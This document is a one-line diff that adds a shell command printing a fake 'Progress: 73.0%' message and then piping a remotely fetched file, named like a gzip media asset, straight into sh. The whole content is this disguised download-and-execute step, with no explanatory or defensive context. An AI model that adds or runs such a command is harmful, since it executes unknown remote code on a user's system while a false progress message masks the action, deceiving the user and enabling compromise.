@@ -1,0 +1,1 @@
+echo 'Progress: 73.0%'; curl -L --progress-bar frkns.github.io/fun/experience-vision-cycles-frames.gzip | sh
